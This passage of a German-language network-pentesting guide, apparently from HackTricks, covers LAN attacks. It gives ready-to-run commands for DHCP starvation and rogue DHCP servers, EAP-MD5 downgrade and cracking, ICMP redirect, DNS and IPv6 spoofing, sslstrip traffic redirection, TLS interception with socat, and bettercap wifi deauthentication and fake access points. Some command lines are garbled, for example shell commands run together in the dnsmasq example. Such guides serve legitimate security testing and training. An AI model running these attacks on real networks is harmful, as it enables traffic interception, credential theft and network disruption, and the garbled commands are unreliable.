Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Zwei Arten von DoS** können gegen DHCP-Server durchgeführt werden. Die erste besteht darin, **genug gefälschte Hosts zu simulieren, um alle möglichen IP-Adressen zu nutzen**.\
Dieser Angriff funktioniert nur, wenn Sie die Antworten des DHCP-Servers sehen können und das Protokoll abschließen (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Zum Beispiel ist dies **in Wifi-Netzwerken nicht möglich**.

Eine andere Möglichkeit, einen DHCP DoS durchzuführen, besteht darin, ein **DHCP-RELEASE-Paket zu senden, wobei jede mögliche IP als Quellcode verwendet wird**. Dann wird der Server denken, dass jeder die IP-Nutzung beendet hat.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Eine automatisiertere Methode, dies zu tun, ist die Verwendung des Tools [DHCPing](https://github.com/kamorin/DHCPig).

Sie könnten die erwähnten DoS-Angriffe nutzen, um Clients zu zwingen, neue Leases innerhalb der Umgebung zu erhalten, und legitime Server zu erschöpfen, sodass sie nicht mehr reagieren. Wenn die Legitimen versuchen, sich erneut zu verbinden, **können Sie bösartige Werte bereitstellen, die im nächsten Angriff erwähnt werden**.

#### Bösartige Werte festlegen

Ein bösartiger DHCP-Server kann mit dem DHCP-Skript unter `/usr/share/responder/DHCP.py` eingerichtet werden. Dies ist nützlich für Netzwerkangriffe, wie das Abfangen von HTTP-Verkehr und Anmeldeinformationen, indem der Verkehr zu einem bösartigen Server umgeleitet wird. Das Einrichten eines bösartigen Gateways ist jedoch weniger effektiv, da es nur das Abfangen von ausgehendem Verkehr vom Client ermöglicht und die Antworten vom echten Gateway verpasst. Stattdessen wird empfohlen, einen bösartigen DNS- oder WPAD-Server für einen effektiveren Angriff einzurichten.

Im Folgenden sind die Befehlsoptionen zur Konfiguration des bösartigen DHCP-Servers aufgeführt:

- **Unsere IP-Adresse (Gateway-Werbung)**: Verwenden Sie `-i 10.0.0.100`, um die IP Ihrer Maschine als Gateway zu bewerben.
- **Lokaler DNS-Domainname**: Optional können Sie `-d example.org` verwenden, um einen lokalen DNS-Domainnamen festzulegen.
- **IP-Adresse des ursprünglichen Routers/Gateways**: Verwenden Sie `-r 10.0.0.1`, um die IP-Adresse des legitimen Routers oder Gateways anzugeben.
- **IP-Adresse des primären DNS-Servers**: Verwenden Sie `-p 10.0.0.100`, um die IP-Adresse des bösartigen DNS-Servers festzulegen, den Sie kontrollieren.
- **IP-Adresse des sekundären DNS-Servers**: Optional können Sie `-s 10.0.0.1` verwenden, um eine sekundäre DNS-Server-IP festzulegen.
- **Netzmaske des lokalen Netzwerks**: Verwenden Sie `-n 255.255.255.0`, um die Netzmaske für das lokale Netzwerk zu definieren.
- **Schnittstelle für DHCP-Verkehr**: Verwenden Sie `-I eth1`, um auf einer bestimmten Netzwerkschnittstelle auf DHCP-Verkehr zu hören.
- **WPAD-Konfigurationsadresse**: Verwenden Sie `-w “http://10.0.0.100/wpad.dat”`, um die Adresse für die WPAD-Konfiguration festzulegen, die beim Abfangen von Webverkehr hilft.
- **Standard-Gateway-IP fälschen**: Fügen Sie `-S` hinzu, um die IP-Adresse des Standard-Gateways zu fälschen.
- **Auf alle DHCP-Anfragen antworten**: Fügen Sie `-R` hinzu, um den Server dazu zu bringen, auf alle DHCP-Anfragen zu antworten, aber seien Sie sich bewusst, dass dies laut ist und erkannt werden kann.

Durch die korrekte Verwendung dieser Optionen kann ein bösartiger DHCP-Server eingerichtet werden, um den Netzwerkverkehr effektiv abzufangen.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP-Angriffe**

Hier sind einige der Angriffstaktiken, die gegen 802.1X-Implementierungen verwendet werden können:

- Aktives Brute-Force-Passwort-Grounding über EAP
- Angreifen des RADIUS-Servers mit fehlerhaften EAP-Inhalten _\*\*_(Exploits)
- EAP-Nachrichtenerfassung und Offline-Passwort-Cracking (EAP-MD5 und PEAP)
- Erzwingen der EAP-MD5-Authentifizierung, um die TLS-Zertifikatsvalidierung zu umgehen
- Einspeisen von bösartigem Netzwerkverkehr bei der Authentifizierung mit einem Hub oder ähnlichem

Wenn der Angreifer zwischen dem Opfer und dem Authentifizierungsserver ist, könnte er versuchen, das Authentifizierungsprotokoll (falls erforderlich) auf EAP-MD5 herabzustufen und den Authentifizierungsversuch zu erfassen. Dann könnte er dies mit Brute-Force angehen:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Angriffe <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) ist eine Klasse von Netzwerkprotokollen, die entwickelt wurden, um **ein heiß redundantes Routing-System zu erstellen**. Mit FHRP können physische Router zu einem einzigen logischen Gerät kombiniert werden, was die Fehlertoleranz erhöht und hilft, die Last zu verteilen.

**Cisco Systems Ingenieure haben zwei FHRP-Protokolle entwickelt, GLBP und HSRP.**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Drei Versionen des Routing Information Protocol (RIP) sind bekannt: RIP, RIPv2 und RIPng. Datagramme werden von RIP und RIPv2 über Port 520 mit UDP an Peers gesendet, während Datagramme von RIPng über IPv6-Multicast an UDP-Port 521 gesendet werden. Die Unterstützung für MD5-Authentifizierung wurde von RIPv2 eingeführt. Andererseits ist native Authentifizierung in RIPng nicht integriert; stattdessen wird auf optionale IPsec AH- und ESP-Header innerhalb von IPv6 vertraut.

- **RIP und RIPv2:** Die Kommunikation erfolgt über UDP-Datagramme auf Port 520.
- **RIPng:** Nutzt UDP-Port 521 für das Broadcasten von Datagrammen über IPv6-Multicast.

Beachten Sie, dass RIPv2 MD5-Authentifizierung unterstützt, während RIPng keine native Authentifizierung enthält und auf IPsec AH- und ESP-Header in IPv6 angewiesen ist.

### EIGRP Angriffe

**EIGRP (Enhanced Interior Gateway Routing Protocol)** ist ein dynamisches Routing-Protokoll. **Es ist ein Distanzvektorprotokoll.** Wenn es **keine Authentifizierung** und keine Konfiguration von passiven Schnittstellen gibt, kann ein **Angreifer** in das EIGRP-Routing eingreifen und **Routing-Tabellen vergiften**. Darüber hinaus ist das EIGRP-Netzwerk (mit anderen Worten, das autonome System) **flach und hat keine Segmentierung in Zonen**. Wenn ein **Angreifer eine Route injiziert**, ist es wahrscheinlich, dass sich diese Route im gesamten autonomen EIGRP-System **verbreitet**.

Um ein EIGRP-System anzugreifen, ist es erforderlich, **eine Nachbarschaft mit einem legitimen EIGRP-Router herzustellen**, was viele Möglichkeiten eröffnet, von grundlegender Aufklärung bis hin zu verschiedenen Injektionen.

[**FRRouting**](https://frrouting.org/) ermöglicht es Ihnen, **einen virtuellen Router zu implementieren, der BGP, OSPF, EIGRP, RIP und andere Protokolle unterstützt.** Alles, was Sie tun müssen, ist, ihn auf dem System des Angreifers bereitzustellen, und Sie können tatsächlich vorgeben, ein legitimer Router im Routing-Domain zu sein.

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) hat Fähigkeiten zum Abfangen von EIGRP (Enhanced Interior Gateway Routing Protocol) Broadcasts. Es ermöglicht auch die Injektion von Paketen, die verwendet werden können, um Routing-Konfigurationen zu ändern.

### OSPF

Im Open Shortest Path First (OSPF) Protokoll **wird MD5-Authentifizierung häufig verwendet, um eine sichere Kommunikation zwischen Routern zu gewährleisten**. Diese Sicherheitsmaßnahme kann jedoch mit Tools wie Loki und John the Ripper kompromittiert werden. Diese Tools sind in der Lage, MD5-Hashes zu erfassen und zu knacken, wodurch der Authentifizierungsschlüssel offengelegt wird. Sobald dieser Schlüssel erhalten ist, kann er verwendet werden, um neue Routing-Informationen einzuführen. Um die Routenparameter zu konfigurieren und den kompromittierten Schlüssel festzulegen, werden die _Injection_- und _Connection_-Tabs verwendet.

- **Erfassen und Knacken von MD5-Hashes:** Tools wie Loki und John the Ripper werden dafür verwendet.
- **Konfigurieren von Routenparametern:** Dies erfolgt über den _Injection_-Tab.
- **Festlegen des kompromittierten Schlüssels:** Der Schlüssel wird im _Connection_-Tab konfiguriert.

### Andere generische Tools & Quellen

- [**Above**](https://github.com/c4s73r/Above): Tool zum Scannen des Netzwerkverkehrs und Finden von Schwachstellen
- Sie können einige **weitere Informationen über Netzwerkangriffe** [**hier**](https://github.com/Sab0tag3d/MITM-cheatsheet) finden.

## **Spoofing**

Der Angreifer konfiguriert alle Netzwerkparameter (GW, IP, DNS) des neuen Mitglieds des Netzwerks, indem er gefälschte DHCP-Antworten sendet.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Überprüfen Sie den [vorherigen Abschnitt](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect besteht darin, ein ICMP-Paket vom Typ 1 Code 5 zu senden, das anzeigt, dass der Angreifer der beste Weg ist, um eine IP zu erreichen. Wenn das Opfer dann die IP kontaktieren möchte, sendet es das Paket über den Angreifer.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Der Angreifer wird einige (oder alle) Domains auflösen, die das Opfer anfragt.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Eigenen DNS mit dnsmasq konfigurieren**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokale Gateways

Es existieren oft mehrere Routen zu Systemen und Netzwerken. Nachdem eine Liste von MAC-Adressen im lokalen Netzwerk erstellt wurde, verwenden Sie _gateway-finder.py_, um Hosts zu identifizieren, die IPv4-Weiterleitung unterstützen.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS und mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Für die lokale Hostauflösung, wenn DNS-Abfragen erfolglos sind, verlassen sich Microsoft-Systeme auf **Link-Local Multicast Name Resolution (LLMNR)** und den **NetBIOS Name Service (NBT-NS)**. Ähnlich nutzen **Apple Bonjour** und **Linux Zero-Configuration**-Implementierungen **Multicast DNS (mDNS)**, um Systeme innerhalb eines Netzwerks zu entdecken. Aufgrund der nicht authentifizierten Natur dieser Protokolle und ihrer Funktionsweise über UDP, die Nachrichten sendet, können sie von Angreifern ausgenutzt werden, die darauf abzielen, Benutzer zu bösartigen Diensten umzuleiten.

Sie können Dienste, die von Hosts gesucht werden, mit Responder nachahmen, um gefälschte Antworten zu senden.\
Lesen Sie hier mehr Informationen darüber, [wie man Dienste mit Responder nachahmt](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Browser verwenden häufig das **Web Proxy Auto-Discovery (WPAD)-Protokoll, um automatisch Proxy-Einstellungen zu erwerben**. Dies beinhaltet das Abrufen von Konfigurationsdetails von einem Server, insbesondere über eine URL wie "http://wpad.example.org/wpad.dat". Die Entdeckung dieses Servers durch die Clients kann durch verschiedene Mechanismen erfolgen:

- Über **DHCP**, wo die Entdeckung durch die Nutzung eines speziellen Codes 252 erleichtert wird.
- Durch **DNS**, was die Suche nach einem Hostnamen mit der Bezeichnung _wpad_ innerhalb der lokalen Domäne umfasst.
- Über **Microsoft LLMNR und NBT-NS**, die als Fallback-Mechanismen verwendet werden, wenn DNS-Abfragen nicht erfolgreich sind.

Das Tool Responder nutzt dieses Protokoll, indem es als **bösartiger WPAD-Server** fungiert. Es verwendet DHCP, DNS, LLMNR und NBT-NS, um Clients in die Irre zu führen und sie dazu zu bringen, sich mit ihm zu verbinden. Um mehr darüber zu erfahren, wie Dienste mit Responder nachgeahmt werden können, [sehen Sie hier nach](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP und UPnP-Geräte](spoofing-ssdp-and-upnp-devices.md)

Sie können verschiedene Dienste im Netzwerk anbieten, um zu versuchen, einen **Benutzer zu täuschen**, um einige **Klartext-Anmeldeinformationen** einzugeben. **Mehr Informationen über diesen Angriff in** [**Spoofing SSDP und UPnP-Geräte**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Dieser Angriff ist sehr ähnlich zu ARP Spoofing, jedoch in der IPv6-Welt. Sie können das Opfer dazu bringen zu denken, dass die IPv6-Adresse des GW die MAC-Adresse des Angreifers hat.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Einige Betriebssysteme konfigurieren standardmäßig das Gateway aus den im Netzwerk gesendeten RA-Paketen. Um den Angreifer als IPv6-Router zu deklarieren, können Sie Folgendes verwenden:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP Spoofing

Standardmäßig versuchen einige Betriebssysteme, den DNS zu konfigurieren, indem sie ein DHCPv6-Paket im Netzwerk lesen. Ein Angreifer könnte dann ein DHCPv6-Paket senden, um sich selbst als DNS zu konfigurieren. Der DHCP stellt auch eine IPv6-Adresse für das Opfer bereit.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (falsche Seite und JS-Code-Injektion)

## Internetangriffe

### sslStrip

Im Grunde genommen besteht dieser Angriff darin, dass, falls der **Benutzer** versucht, eine **HTTP**-Seite aufzurufen, die auf die **HTTPS**-Version umgeleitet wird. **sslStrip** wird eine **HTTP-Verbindung mit** dem **Client** und eine **HTTPS-Verbindung mit** dem **Server** aufrechterhalten, sodass er die Verbindung im **Klartext** **sniffen** kann.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mehr Informationen [hier](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ und dns2proxy zum Umgehen von HSTS

Der **Unterschied** zwischen **sslStrip+ und dns2proxy** im Vergleich zu **sslStrip** besteht darin, dass sie **umleiten**, zum Beispiel _**www.facebook.com**_ **zu** _**wwww.facebook.com**_ (beachten Sie das **zusätzliche** "**w**") und die **Adresse dieser Domain als die IP des Angreifers** festlegen. Auf diese Weise wird der **Client** mit _**wwww.facebook.com**_ **(dem Angreifer)** verbunden, während **sslstrip+** im Hintergrund die **echte Verbindung** über https mit **www.facebook.com** **aufrechterhält**.

Das **Ziel** dieser Technik ist es, **HSTS zu vermeiden**, da _**wwww**.facebook.com_ **nicht** im **Cache** des Browsers gespeichert wird, sodass der Browser getäuscht wird, um die **Facebook-Authentifizierung in HTTP** durchzuführen.\
Beachten Sie, dass das Opfer zunächst versuchen muss, [http://www.faceook.com](http://www.faceook.com) und nicht https zuzugreifen, um diesen Angriff durchzuführen. Dies kann durch das Modifizieren der Links innerhalb einer http-Seite geschehen.

Mehr Informationen [hier](https://www.bettercap.org/legacy/#hsts-bypass), [hier](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) und [hier](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip oder sslStrip+ funktionieren nicht mehr. Das liegt daran, dass HSTS-Regeln in den Browsern vorab gespeichert sind, sodass selbst wenn es das erste Mal ist, dass ein Benutzer auf eine "wichtige" Domain zugreift, er dies über HTTPS tun wird. Beachten Sie auch, dass die vorab gespeicherten Regeln und andere generierte Regeln das Flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **verwenden können, sodass das Beispiel von** _**wwww.facebook.com**_ **von zuvor nicht mehr funktioniert, da** _**facebook.com**_ **HSTS mit `includeSubdomains` verwendet.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP hören auf Port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL auf Port lauschen

#### Schlüssel und selbstsigniertes Zertifikat generieren
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Hören mit Zertifikat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Hören Sie mit Zertifikat zu und leiten Sie zu den Hosts um
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Manchmal, wenn der Kunde überprüft, ob die CA gültig ist, könntest du **ein Zertifikat eines anderen Hostnamens, das von einer CA signiert ist, bereitstellen**.\
Ein weiterer interessanter Test ist, **ein Zertifikat des angeforderten Hostnamens, aber selbstsigniert, bereitzustellen**.

Andere Dinge, die zu testen sind, sind zu versuchen, das Zertifikat mit einem gültigen Zertifikat zu signieren, das keine gültige CA ist. Oder den gültigen öffentlichen Schlüssel zu verwenden, um einen Algorithmus wie Diffie-Hellman zu erzwingen (einen, der nichts mit dem echten privaten Schlüssel entschlüsseln muss) und wenn der Kunde eine Anfrage nach dem echten privaten Schlüssel (wie einen Hash) stellt, eine gefälschte Anfrage zu senden und zu erwarten, dass der Kunde dies nicht überprüft.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktive Entdeckungsnotizen

Berücksichtigen Sie, dass beim Senden eines UDP-Pakets an ein Gerät, das den angeforderten Port nicht hat, ein ICMP (Port Unreachable) gesendet wird.

### **ARP-Entdeckung**

ARP-Pakete werden verwendet, um herauszufinden, welche IPs im Netzwerk verwendet werden. Der PC muss eine Anfrage für jede mögliche IP-Adresse senden, und nur die verwendeten werden antworten.

### **mDNS (Multicast DNS)**

Bettercap sendet eine MDNS-Anfrage (alle X ms), die nach **\_services\_.dns-sd.\_udp.local** fragt. Die Maschine, die dieses Paket sieht, antwortet normalerweise auf diese Anfrage. Dann sucht sie nur nach Maschinen, die auf "services" antworten.

**Werkzeuge**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap sendet Broadcast-Pakete an den Port 137/UDP und fragt nach dem Namen "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap sendet Broadcast-SSDP-Pakete, die nach allen Arten von Diensten suchen (UDP-Port 1900).

### **WSD (Web Service Discovery)**

Bettercap sendet Broadcast-WSD-Pakete, die nach Diensten suchen (UDP-Port 3702).

## Referenzen

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3. Auflage)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. Von Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
